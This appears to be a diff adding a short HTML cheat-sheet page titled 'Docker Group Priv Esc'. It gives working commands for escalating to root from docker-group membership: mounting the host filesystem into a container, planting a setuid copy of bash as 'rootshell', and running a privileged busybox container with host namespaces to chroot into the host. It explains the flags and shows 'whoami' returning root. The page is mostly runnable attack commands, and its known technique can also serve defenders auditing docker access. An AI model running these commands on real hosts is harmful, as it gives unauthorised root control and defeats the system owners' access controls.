@@ -1,0 +1,31 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Docker Group Priv Esc</title>
+</head><body>If you are part of the docker group, you could have the ability to gain an admin shell<br/>
+<br/>
+# -v volume<br/>
+# -i interactive<br/>
+# -t allocate psuedo tty<br/>
+docker run -v /:/tmp -it &lt;docker name&gt; &lt;command&gt;<br/>
+docker run -v /:/tmp -i -t bash bash<br/>
+<br/>
+<br/>
+Another option<br/>
+$ docker run -v /home/&lt;USER&gt;:/h_docs ubuntu bash -c "cp /bin/bash /h_docs/rootshell &amp;&amp; chmod 4777 /h_docs/rootshell;"<br/>
+$ ./rootshell -p<br/>
+# whoami<br/>
+root<br/>
+<br/>
+<br/>
+More defined flags:<br/>
+docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host<br/>
+<br/>
+The three ‘=host’ flags bypass the network, pid and ipc namespaces. <br/>
+The volume flag mounts the root filesystem of the host to the ‘/host’ folder in the container (you can’t mount to ‘/’ in the container). <br/>
+The privileged flags gives the user full access to the root user’s capabilities.<br/>
+<br/>
+All we need is the chroot command, so we use a small image (busybox) to chroot to the filesystem we mounted.<br/>
+<br/>
+What we end up with is a Docker container that is running as root with full capabilities in the host’s filesystem, will full access to the network, process table and IPC constructs on the host. You can even ‘su’ to other users on the host.</body></html>
